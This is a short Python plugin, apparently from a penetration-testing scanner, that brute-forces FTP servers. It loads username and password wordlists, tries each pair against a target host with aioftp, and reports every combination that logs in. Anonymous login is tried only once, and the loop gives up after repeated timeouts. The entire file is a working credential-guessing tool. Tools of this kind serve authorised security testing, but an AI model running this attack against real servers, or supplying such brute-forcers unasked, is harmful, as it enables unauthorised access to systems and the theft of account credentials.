#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import aioftp
from lib.core.env import *
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.FTP

    def load_dict(self):
        username_txt_path = self.parameter.get("U", None)
        if username_txt_path:
            self.username_list = self.read_file(username_txt_path)
        else:
            self.username_list = self.get_default_dict("ftp_usernames.txt")

        password_txt_path = self.parameter.get("P", None)
        if password_txt_path:
            self.password_list = self.read_file(password_txt_path)
        else:
            self.password_list = self.get_default_dict("ftp_passwords.txt")


    async def prove(self):
        if self.base_url is None:
            anonymous = False
            flag = 3
            async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list):
                try:
                    if username == 'anonymous':
                        if anonymous:
                            continue
                        else:
                            anonymous = True
                    client = aioftp.Client()
                    await client.connect(self.host, self.port)
                    await client.login(username, password)
                    yield username + "/" + password

                except Exception as e:
                    if "timed out" in str(e):
                        if flag == 0:
                            return
                        flag -= 1